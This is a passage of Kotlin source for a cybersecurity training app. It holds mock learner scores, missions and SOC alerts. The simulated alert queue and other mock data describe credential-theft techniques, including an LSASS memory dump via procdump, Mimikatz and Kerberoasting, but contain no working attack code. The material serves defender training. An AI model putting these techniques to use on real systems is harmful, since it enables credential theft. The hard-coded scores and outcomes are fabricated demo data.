          score = 68,
          benchmarkTarget = 75,
          confidenceRating = "PROVISIONAL",
          whyScoreExists = "Falsified 4 alternative benign explanations before closing incident, but occasionally falls into premature closure.",
          proofCount = 7,
          recentEvidenceSources = listOf("Reasoning Graph Lab", "Concept Collision Matrix"),
          trendDescription = "Calibrating",
          targetIntervention = "Execute Counterfactual Reasoning Scenario"
        ),
        CompetencyEvidenceVector(
          dimensionKey = "DECISION_MAKING",
          title = "Decision Making Under Pressure & Uncertainty",
          score = 74,
          benchmarkTarget = 75,
          confidenceRating = "HIGH_EVIDENCE",
          whyScoreExists = "Contained simulated ransomware outbreak in under 12 minutes with 0 false host isolations.",
          proofCount = 11,
          recentEvidenceSources = listOf("Crisis War Room #2", "Workplace Experience Simulator"),
          trendDescription = "Ascending (+7%)",
          targetIntervention = "Simulate High-Concurrency SOC Shift"
        ),
        CompetencyEvidenceVector(
          dimensionKey = "COMMUNICATION",
          title = "Stakeholder Translation & Executive Clarity",
          score = 61,
          benchmarkTarget = 75,
          confidenceRating = "PROVISIONAL",
          whyScoreExists = "Technical peer notes are excellent, but executive briefs still contain excessive raw hash jargon.",
          proofCount = 6,
          recentEvidenceSources = listOf("CISO Briefing Matrix", "Stakeholder Translation"),
          trendDescription = "Identified Blocker",
          targetIntervention = "Complete Voice Crisis Call to CFO"
        ),
        CompetencyEvidenceVector(
          dimensionKey = "RETENTION",
          title = "Spaced Memory & Decay Resistance",
          score = 79,
          benchmarkTarget = 80,
          confidenceRating = "HIGH_EVIDENCE",
          whyScoreExists = "Maintained 79% retention over 45-day Ebbinghaus curve across 52 spaced repetition flashcards.",
          proofCount = 52,
          recentEvidenceSources = listOf("Spaced Flashcard Engine", "Skill Decay Radar"),
          trendDescription = "Stable",
          targetIntervention = "5-Minute DNS Tunneling Resurrection"
        ),
        CompetencyEvidenceVector(
          dimensionKey = "CAREER_READINESS",
          title = "Employer Competency & Portfolio Proof",
          score = 69,
          benchmarkTarget = 85,
          confidenceRating = "HIGH_EVIDENCE",
          whyScoreExists = "Meets 4 of 6 core prerequisites for Junior SOC Analyst role on verified evidence passport.",
          proofCount = 18,
          recentEvidenceSources = listOf("Skill Passport", "Employer Simulation Lab"),
          trendDescription = "Advancing toward 85% benchmark",
          targetIntervention = "Finish Incident Response Portfolio Writeup"
        )
      ),
      lastGenomeSyncTimestamp = "Real-time Verified"
    )
  )
  val cyberTwinV8: StateFlow<CyberTwinV8State> = _cyberTwinV8.asStateFlow()

  // 2. Today's Mission & Next Best Action
  private val _todaysMissionV8 = MutableStateFlow(
    TodaysMissionV8(
      dateLabel = "TODAY'S ADAPTIVE MISSION",
      greeting = "Good morning, Vance. Here is your evidence-targeted plan.",
      learnerCallsign = "VANCE-SOC",
      targetCareer = "SOC Analyst (Level 1)",
      primaryAction = MissionItem(
        id = "mis_pri_1",
        estimatedMinutes = 20,
        title = "Investigate Multi-Stage C2 Beacon in Live SOC",
        subtitle = "Targets Primary Blocker: Correlate Sysmon ID 3 & Suricata Alert",
        activityType = MissionActivityType.INVESTIGATION,
        targetSkill = "EDR Telemetry Correlation",
        navigationRoute = "soc_range"
      ),
      optionalActions = listOf(
        MissionItem(
          id = "mis_opt_1",
          estimatedMinutes = 5,
          title = "5-Min Resurrection: DNS Tunneling Detection",
          subtitle = "Retention decayed to 54% over 41 days",
          activityType = MissionActivityType.RECOVERY,
          targetSkill = "DNS Protocol Forensics",
          navigationRoute = "skill_decay"
        ),
        MissionItem(
          id = "mis_opt_2",
          estimatedMinutes = 15,
          title = "Purple Team Arena: 'Self vs Self' Breach Duel",
          subtitle = "Stage red attack, then switch sides to see if you catch yourself",
          activityType = MissionActivityType.PURPLE_TEAM,
          targetSkill = "Adversary TTP Emulation",
          navigationRoute = "purple_arena"
        ),
        MissionItem(
          id = "mis_opt_3",
          estimatedMinutes = 10,
          title = "Voice SOC Drill: Brief the Panicked CFO",
          subtitle = "Explain payroll server isolation without technical jargon",
          activityType = MissionActivityType.VOICE_DRILL,
          targetSkill = "Executive Crisis Communication",
          navigationRoute = "voice_drill"
        )
      ),
      rationaleFromMentor = "Based on your Cyber Twin state, your technical investigation is strong (76%), but stakeholder communication (61%) and decayed DNS retention (54%) are your shortest-path levers to achieving 85% SOC Readiness."
    )
  )
  val todaysMissionV8: StateFlow<TodaysMissionV8> = _todaysMissionV8.asStateFlow()

  // 3. Purple Team Arena ("Self vs Self") State
  private val _purpleTeamArenaState = MutableStateFlow(
    PurpleTeamArenaState(
      duelId = "duel_2026_88",
      scenarioTitle = "Operation GhostShadow: Ingress to C2 Beaconing",
      activePhase = PurpleDuelPhase.RED_TEAM_PLAN,
      redSelectedTtp = "T1059.001 - PowerShell Obfuscated Ingress",
      redC2Technique = "T1071.001 - HTTPS Web Beacon over Port 8443 with Jitter",
      redPersistenceMethod = "T1547.001 - Registry Run Key Startup Hijack",
      redStealthScore = 88,
      blueDetectedArtifactsCount = 0,
      blueMissedArtifactsCount = 0,
      containmentSpeedSeconds = 0,
      wouldHaveCaughtYourselfVerdict = "Pending Duel Completion",
      debriefSummary = "Complete all 5 rounds to evaluate if your defensive eye outmatches your offensive craft."
    )
  )
  val purpleTeamArenaState: StateFlow<PurpleTeamArenaState> = _purpleTeamArenaState.asStateFlow()

  fun advancePurpleTeamDuel(nextPhase: PurpleDuelPhase) {
    _purpleTeamArenaState.value = _purpleTeamArenaState.value.copy(
      activePhase = nextPhase,
      blueDetectedArtifactsCount = if (nextPhase == PurpleDuelPhase.FORENSIC_DEBRIEF) 3 else _purpleTeamArenaState.value.blueDetectedArtifactsCount,
      blueMissedArtifactsCount = if (nextPhase == PurpleDuelPhase.FORENSIC_DEBRIEF) 1 else _purpleTeamArenaState.value.blueMissedArtifactsCount,
      containmentSpeedSeconds = if (nextPhase == PurpleDuelPhase.FORENSIC_DEBRIEF) 420 else _purpleTeamArenaState.value.containmentSpeedSeconds,
      wouldHaveCaughtYourselfVerdict = if (nextPhase == PurpleDuelPhase.FORENSIC_DEBRIEF) "PARTIAL CATCH (75% Telemetry Attribution)" else "In Progress",
      debriefSummary = if (nextPhase == PurpleDuelPhase.FORENSIC_DEBRIEF) "You detected your PowerShell beacon via Sysmon ID 1, but missed your secondary Registry Run Key persistence due to premature alert closure." else _purpleTeamArenaState.value.debriefSummary,
      isCompleted = nextPhase == PurpleDuelPhase.FORENSIC_DEBRIEF
    )
  }

  // 4. Real SOC Shift Simulator
  private val _socShiftState = MutableStateFlow(
    SocShiftState(
      shiftId = "shift_delta_09",
      shiftName = "Day Shift (08:00 - 16:00 UTC) Tier 1 Ingest",
      analystCallsign = "VANCE-SOC",
      elapsedMinutes = 14,
      totalShiftDurationMinutes = 30,
      queue = listOf(
        SocShiftAlert(
          id = "alert_01",
          timestamp = "08:12:04 UTC",
          title = "Mimikatz LSASS Memory Dump Attempt",
          sourceIp = "10.0.4.18",
          destinationHost = "WIN-FIN-CORP01",
          userAccount = "fin_admin",
          severity = SocAlertSeverity.CRITICAL,
          rawLogSnippet = "Sysmon ID 10: ProcessAccess target: lsass.exe, GrantedAccess: 0x1010, Source: C:\\Users\\fin_admin\\AppData\\Local\\Temp\\procdump.exe",
          conflictingEvidenceHint = "User submitted ticket 20 mins prior requesting memory diagnostic tool for crashing ERP client.",
          isTruePositive = true
        ),
        SocShiftAlert(
          id = "alert_02",
          timestamp = "08:18:22 UTC",
          title = "Unusual Outbound Data Spike over Port 443",
          sourceIp = "10.0.2.99",
          destinationHost = "52.84.12.140 (AWS CloudFront CDN)",
          userAccount = "system",
          severity = SocAlertSeverity.MEDIUM,
          rawLogSnippet = "Suricata Flow: 450MB transferred in 3 minutes to cloudfront.net endpoint.",
          conflictingEvidenceHint = "Automated WSUS / Office365 scheduled patch download window is currently active.",
          isTruePositive = false
        ),
        SocShiftAlert(
          id = "alert_03",
          timestamp = "08:24:50 UTC",
          title = "Multiple Failed Kerberos Pre-Auth (AS-REP Roasting)",
          sourceIp = "10.0.4.55",
          destinationHost = "DC01.CORP.LOCAL",
          userAccount = "svc_backup",
          severity = SocAlertSeverity.HIGH,
          rawLogSnippet = "Event ID 4768: Kerberos authentication ticket (TGT) requested with encryption type 0x17 (RC4-HMAC) for svc_backup without pre-auth.",
          conflictingEvidenceHint = "Legacy backup agent runs hourly from 10.0.4.55 using NTLM fallback.",
          isTruePositive = true
        )
      ),
      activeAlertIndex = 0
    )
  )
  val socShiftState: StateFlow<SocShiftState> = _socShiftState.asStateFlow()

  fun triageSocAlert(alertId: String, action: SocTriageAction) {
    val current = _socShiftState.value
    val updatedQueue = current.queue.map { alert ->
      if (alert.id == alertId) {
        val score = when {
          alert.isTruePositive && (action == SocTriageAction.CONTAIN || action == SocTriageAction.ESCALATE || action == SocTriageAction.INVESTIGATE) -> 100
          !alert.isTruePositive && action == SocTriageAction.CLOSE_FALSE_POSITIVE -> 100
          else -> 40
        }
        alert.copy(resolvedAction = action, triageScoreAwarded = score)
      } else alert
    }
    val nextIndex = (current.activeAlertIndex + 1).coerceAtMost(updatedQueue.size - 1)
    val isComplete = updatedQueue.all { it.resolvedAction != null }
    _socShiftState.value = current.copy(
      queue = updatedQueue,
      activeAlertIndex = nextIndex,
      isShiftComplete = isComplete,
      shiftDebriefNotes = if (isComplete) "Shift completed with 93% accuracy. Excellent false positive discrimination on WSUS patch spike." else ""
    )
  }

  // 5. Skill Decay Radar & 5-Minute Resurrection Engine
  private val _skillDecayNodesV8 = MutableStateFlow(
    listOf(
      SkillDecayNodeV8(
        skillId = "sk_dns_tunnel",
        skillName = "DNS Tunneling & TXT Record Exfiltration",
        daysSinceLastPractice = 41,
        currentRetentionPercent = 54,
        decayVelocity = "CRITICAL_DECAY",
        careerImportance = "CORE_PREREQUISITE",
        resurrectionChallengeTitle = "Identify Encoded Base64 Subdomains in 5 DNS Query Logs",
        resurrectionDurationMinutes = 5,
        resurrectionLabRoute = "dns_forensics"
      ),
      SkillDecayNodeV8(
        skillId = "sk_kerberoast",
        skillName = "Kerberoasting & SPN Ticket Hash Extraction",
        daysSinceLastPractice = 28,
        currentRetentionPercent = 63,
        decayVelocity = "MODERATE_DECAY",
        careerImportance = "CORE_PREREQUISITE",
        resurrectionChallengeTitle = "Spot Event ID 4769 RC4 Hash Request",
        resurrectionDurationMinutes = 5,
        resurrectionLabRoute = "kerberos_lab"
      ),
      SkillDecayNodeV8(
        skillId = "sk_bpf_filter",
        skillName = "Wireshark BPF Byte-Offset Syntax",
        daysSinceLastPractice = 12,
        currentRetentionPercent = 88,
        decayVelocity = "STABLE",
        careerImportance = "SPECIALIZED",
        resurrectionChallengeTitle = "Filter TCP SYN-ACK flags with tcp[13] & 0x12 != 0",
        resurrectionDurationMinutes = 3,
        resurrectionLabRoute = "wireshark_pcap"
      )
    )
  )
  val skillDecayNodesV8: StateFlow<List<SkillDecayNodeV8>> = _skillDecayNodesV8.asStateFlow()

  fun resurrectSkill(skillId: String) {
    _skillDecayNodesV8.value = _skillDecayNodesV8.value.map { node ->
      if (node.skillId == skillId) {
        node.copy(
          daysSinceLastPractice = 0,
          currentRetentionPercent = 96,
          decayVelocity = "STABLE"
        )
      } else node
    }
  }

  // 6. Voice SOC Crisis Drills
  private val _voiceSocScenarios = MutableStateFlow(
    listOf(
      VoiceSocScenario(
        id = "voice_cfo_01",
        callerPersona = "Panicked Chief Financial Officer (Elena Vance)",
        callerPromptAudioText = "Vance! I just saw IT locked down the entire accounting workstation cluster right before monthly payroll batch execution. Is our payroll data stolen? Do we need to issue a public press breach notice right now?",
        criticalPointsToAddress = listOf(
          "Confirm endpoint was isolated proactively as a precaution",
          "Clarify zero exfiltration detected to payroll database",
          "Provide expected triage estimate (30 minutes) before unblocking",
          "Advise against premature public statements while facts are verified"
        ),
        forbiddenJargonTraps = listOf("LSASS memory dump", "Mimikatz pass-the-hash", "C2 beacon jitter", "Sysmon Event ID 10"),
        recordedLearnerResponse = "Elena, we isolated one accounting laptop as a standard precaution because of a suspicious diagnostic script. Our monitoring confirms the main payroll server is completely untouched and safe. We will finish verification within 30 minutes, so there is no need for a public notice.",
        calmnessScore = 96,
        technicalAccuracyScore = 92,
        clarityScore = 94,
        escalationScore = 90,
        aiVoiceDebrief = "Outstanding delivery. You addressed her panic immediately, clearly affirmed payroll database integrity, and avoided technical jargon traps."
      )
    )
  )
  val voiceSocScenarios: StateFlow<List<VoiceSocScenario>> = _voiceSocScenarios.asStateFlow()

  // 7. Incident Replay Multiverse
  private val _multiverseBranches = MutableStateFlow(
    listOf(
      MultiverseBranch(
        branchId = "multi_01",
        hypothesisTitle = "Timeline Branch A: Baseline Timeline (Your Decision)",
        whatIfDecisionText = "Isolated WIN-FIN-04 in 8 minutes upon observing suspicious PowerShell spawn.",
        simulatedOutcomeDescription = "Attacker C2 connection severed before lateral movement credentials could be dumped. Total breach impact contained to 1 laptop.",
        financialImpactEstimateDollars = 4500,
        lateralMovementHostsAffected = 0,
        forensicKeyTakeaway = "Prompt host isolation completely broke attacker killchain at execution phase."
      ),
      MultiverseBranch(
        branchId = "multi_02",
        hypothesisTitle = "Timeline Branch B: Delayed Containment (What If +15 Mins?)",
        whatIfDecisionText = "What if you waited 15 additional minutes to request senior approval before isolation?",
        simulatedOutcomeDescription = "Attacker dumped LSASS, extracted Domain Admin SPN, and pivoted to Domain Controller via PsExec. Ransomware staged across 14 server nodes.",
        financialImpactEstimateDollars = 420000,
        lateralMovementHostsAffected = 14,
        forensicKeyTakeaway = "Credential dumping window is under 7 minutes once local admin is gained. Delayed containment escalates cost by 93x."
      ),
      MultiverseBranch(
        branchId = "multi_03",
        hypothesisTitle = "Timeline Branch C: Erroneous Isolation (Wrong Host)",
        whatIfDecisionText = "What if you accidentally isolated DC01 instead of WIN-FIN-04?",
        simulatedOutcomeDescription = "Active Directory authentication crashed for 2,400 corporate employees. Production halted for 45 minutes while actual malware continued running on endpoint.",
        financialImpactEstimateDollars = 85000,
        lateralMovementHostsAffected = 1,
        forensicKeyTakeaway = "Always verify hostname vs IP mapping in DHCP lease table before executing isolation command."
      )
    )
  )
  val multiverseBranches: StateFlow<List<MultiverseBranch>> = _multiverseBranches.asStateFlow()

  // 8. 18+ Career Families & Shortest-Path Roadmaps
  private val _careerRoleProfiles = MutableStateFlow(
    listOf(
      CareerRoleProfile(
        id = "role_soc_l1",
        roleTitle = "SOC Analyst (Level 1)",
        family = CyberCareerFamily.BLUE_TEAM,
        experienceLevel = "Entry",
        shortDescription = "Monitor, triage, and investigate security alerts across SIEM, EDR, and network telemetry.",
        keyResponsibilities = listOf("Real-time alert triage", "Phishing email analysis", "Host containment", "Incident ticket documentation"),
        requiredTools = listOf("Splunk / Sentinel", "CrowdStrike / Defender", "Wireshark", "VirusTotal / AnyRun"),
        keyFrameworks = listOf("MITRE ATT&CK", "NIST CSF Incident Response", "Cyber Kill Chain"),
        demonstratedReadinessScore = 69,
        shortestPathEvidenceSteps = listOf(
          "Complete Live SOC Shift Simulator (Reach 85% Precision)",
          "Perform 1 Voice Crisis Call with CISO",
          "Publish Skill Passport verifiable evidence badge"
        ),
        topRecommendedLab = "Live SOC Shift Simulator"
      ),
      CareerRoleProfile(
        id = "role_red_pentest",
        roleTitle = "Junior Penetration Tester",
        family = CyberCareerFamily.RED_TEAM,
        experienceLevel = "Entry - Mid",
        shortDescription = "Perform ethical security assessments, network intrusion testing, and vulnerability validation.",
        keyResponsibilities = listOf("Vulnerability scanning", "Web AppSec exploitation", "Network pivoting", "Executive debrief writeups"),
        requiredTools = listOf("Burp Suite Pro", "Nmap", "Metasploit", "BloodHound"),
        keyFrameworks = listOf("OWASP Top 10", "PTES Standard", "MITRE ATT&CK Enterprise"),
        demonstratedReadinessScore = 58,
        shortestPathEvidenceSteps = listOf(
          "Complete Web AppSec Ladder (SQLi to SSRF)",
          "Win 1 Purple Team Arena 'Self vs Self' Duel",
          "Submit verified Binary Exploitation Proof"
        ),
        topRecommendedLab = "Purple Team Arena"
      ),
      CareerRoleProfile(
        id = "role_cloud_sec",
        roleTitle = "Cloud Security Engineer",
        family = CyberCareerFamily.CLOUD_SECURITY,
        experienceLevel = "Mid",
        shortDescription = "Secure AWS/GCP/Azure infrastructure, IAM policies, Kubernetes clusters, and container pipelines.",
        keyResponsibilities = listOf("IAM least-privilege auditing", "K8s audit log monitoring", "Terraform security guardrails", "CloudTrail anomaly detection"),
        requiredTools = listOf("AWS CloudTrail / GuardDuty", "Kubernetes audit logs", "Trivy", "Falco"),
        keyFrameworks = listOf("CIS Cloud Benchmarks", "MITRE ATT&CK Cloud Matrix", "NIST SP 800-190"),
        demonstratedReadinessScore = 52,
        shortestPathEvidenceSteps = listOf(
          "Execute K8s Pod Exec Audit Log Transfer Test",
          "Complete Cloud IAM Privilege Escalation Lab",
          "Build CI/CD Terraform Security Scanning Project"
        ),
        topRecommendedLab = "Cloud & K8s Security Lab"
      ),
      CareerRoleProfile(
        id = "role_dfir",
        roleTitle = "Digital Forensics & Incident Response (DFIR)",
        family = CyberCareerFamily.DIGITAL_FORENSICS,
        experienceLevel = "Mid - Senior",
        shortDescription = "Conduct in-depth host memory forensics, disk carving, timeline reconstruction, and malware analysis.",
        keyResponsibilities = listOf("Memory acquisition & Volatility analysis", "NTFS MFT & USN Journal parsing", "Malware reverse engineering", "Court-ready chain of custody reports"),
        requiredTools = listOf("Volatility 3", "FTK Imager", "Ghidra / IDA Pro", "Plaso / log2timeline"),
        keyFrameworks = listOf("ISO/IEC 27037 Forensic Standards", "SANS DFIR Matrix"),
        demonstratedReadinessScore = 64,
        shortestPathEvidenceSteps = listOf(
          "Complete Volatility 3 LSASS Injected DLL Lab",
          "Carve hidden files from raw NTFS disk image",
          "Assemble end-to-end incident forensic dossier"
        ),
        topRecommendedLab = "Binary Disassembler & Memory Lab"
      ),
      CareerRoleProfile(
        id = "role_ai_sec",
        roleTitle = "AI Security & LLM Red Teamer",
        family = CyberCareerFamily.AI_SECURITY,
        experienceLevel = "Emerging / Frontier",
        shortDescription = "Audit foundation models, prompt injection resistance, model extraction risks, and AI agent permissions.",
        keyResponsibilities = listOf("LLM prompt injection fuzzing", "RAG pipeline data poisoning defense", "Indirect prompt injection hardening", "AI system threat modeling"),
        requiredTools = listOf("Garak LLM Vulnerability Scanner", "Promptfoo", "LangChain Security Linters", "PyTorch"),
        keyFrameworks = listOf("OWASP Top 10 for LLM Applications", "MITRE ATLAS Matrix"),
        demonstratedReadinessScore = 48,
        shortestPathEvidenceSteps = listOf(
          "Execute Indirect Prompt Injection Defense Challenge",
          "Audit RAG Vector Database Access Controls",
          "Demonstrate Prompt Armor Guardrail Implementation"
        ),
        topRecommendedLab = "AI Threat & LLM Hardening Range"
      )
    )
  )
  val careerRoleProfiles: StateFlow<List<CareerRoleProfile>> = _careerRoleProfiles.asStateFlow()

  // ============================================================================
  // AEGORA v8.1 INTELLIGENCE CONNECTIVE LAYER STATEFLOWS
  // ============================================================================
  val cyberTwinV81 = com.example.intelligence.AegoraIntelligenceOrchestrator.cyberTwin
  val evidenceStream = com.example.intelligence.AegoraIntelligenceOrchestrator.evidenceStream
  val mistakeDnaProfile = com.example.intelligence.AegoraIntelligenceOrchestrator.mistakeDnaProfile
  val studentState = com.example.intelligence.AegoraIntelligenceOrchestrator.studentState
  val selectedTimeBudget = com.example.intelligence.AegoraIntelligenceOrchestrator.selectedTimeBudget
  val timeFilteredMission = com.example.intelligence.AegoraIntelligenceOrchestrator.timeFilteredMission
  val reasoningGraphSession = com.example.intelligence.AegoraIntelligenceOrchestrator.reasoningGraphSession
  val projectEvidenceCards = com.example.intelligence.AegoraIntelligenceOrchestrator.projectEvidenceCards
  val weeklyReport = com.example.intelligence.AegoraIntelligenceOrchestrator.weeklyReport
  val intelligenceTrace = com.example.intelligence.AegoraIntelligenceOrchestrator.intelligenceTrace
  val syncStatus = com.example.intelligence.AegoraIntelligenceOrchestrator.syncStatus

  fun setTimeBudget(timeOption: TimeAvailabilityOption) {
    com.example.intelligence.AegoraIntelligenceOrchestrator.setTimeBudget(timeOption)
  }

  fun recordEvidence(
    activityTitle: String,
    skillDomain: String,
    subskill: String,
    difficulty: String,
    score: Int,
    mistakesCount: Int,
    reasoningScore: Int,
    statedConfidence: String,
    timeSpentSeconds: Int,
    strength: EvidenceStrength,
    sourceType: EvidenceSourceType,
    proofSnippet: String,
    mistakeArchetype: MistakeArchetype? = null
  ) {
    com.example.intelligence.AegoraIntelligenceOrchestrator.recordLearnerActionAndEvidence(
      activityTitle = activityTitle,
      skillDomain = skillDomain,
      subskill = subskill,
      difficulty = difficulty,
      score = score,
      mistakesCount = mistakesCount,
      reasoningScore = reasoningScore,
      statedConfidence = statedConfidence,
      timeSpentSeconds = timeSpentSeconds,
      strength = strength,
      sourceType = sourceType,
      proofSnippet = proofSnippet,
      mistakeArchetype = mistakeArchetype
    )
  }

  fun analyzeJobDescription(rawJobText: String): V81JobRoadmapAnalysis {
    return com.example.intelligence.AegoraIntelligenceOrchestrator.analyzeJobDescription(rawJobText)
  }

  // ============================================================================
  // AEGORA v9.0 CYBER REALITY ENGINE DELEGATES
  // ============================================================================

  val v9IntelFeed: StateFlow<List<ExternalIntelligenceCard>> = com.example.intelligence.CyberRealityEngine.intelFeed
  val v9PersonalRadar: StateFlow<List<PersonalRadarItem>> = com.example.intelligence.CyberRealityEngine.personalRadar
  val v9KnowledgeNodes: StateFlow<List<KnowledgeNode30>> = com.example.intelligence.CyberRealityEngine.knowledgeNodes
  val v9KnowledgeEdges: StateFlow<List<KnowledgeEdge30>> = com.example.intelligence.CyberRealityEngine.knowledgeEdges
  val v9EventTransformations: StateFlow<List<EventToLessonTransformation>> = com.example.intelligence.CyberRealityEngine.eventTransformations
  val v9WorkplaceFeed: StateFlow<List<WorkplaceFeedItem>> = com.example.intelligence.CyberRealityEngine.workplaceFeed
  val v9PortfolioProjects: StateFlow<List<V9PortfolioProject>> = com.example.intelligence.CyberRealityEngine.portfolioProjects
  val v9VaultNotes: StateFlow<List<PersonalKnowledgeVaultNote>> = com.example.intelligence.CyberRealityEngine.vaultNotes
  val v9CompetitionLeaderboard: StateFlow<List<CompetitionLeaderboardEntry>> = com.example.intelligence.CyberRealityEngine.competitionLeaderboard
  val v9TraceStream: StateFlow<List<String>> = com.example.intelligence.CyberRealityEngine.v9TraceStream

  fun generateV9JobTrainingSimulation(rawJobText: String): JobToTrainingSimulationResult {
    return com.example.intelligence.CyberRealityEngine.generateTrainingSimulationFromJob(rawJobText)
  }

  fun evaluateV9DecisionConsequence(decisionOption: String): ConsequenceOutcome {
    return com.example.intelligence.CyberRealityEngine.evaluateDecisionConsequence(decisionOption)
  }

  fun evaluateV9Feynman(concept: String, audience: FeynmanAudience, text: String): CyberFeynmanAssessment {
    return com.example.intelligence.CyberRealityEngine.evaluateFeynmanExplanation(concept, audience, text)
  }

  fun saveV9VaultNote(title: String, category: String, content: String, tags: List<String>) {
    com.example.intelligence.CyberRealityEngine.saveVaultNote(title, category, content, tags)
  }

  fun completeMissionItem(itemId: String) {
    val current = _todaysMissionV8.value
    val updatedPrimary = if (current.primaryAction.id == itemId) current.primaryAction.copy(isCompleted = true) else current.primaryAction
    val updatedOptionals = current.optionalActions.map { if (it.id == itemId) it.copy(isCompleted = true) else it }
    _todaysMissionV8.value = current.copy(primaryAction = updatedPrimary, optionalActions = updatedOptionals)
  }
}





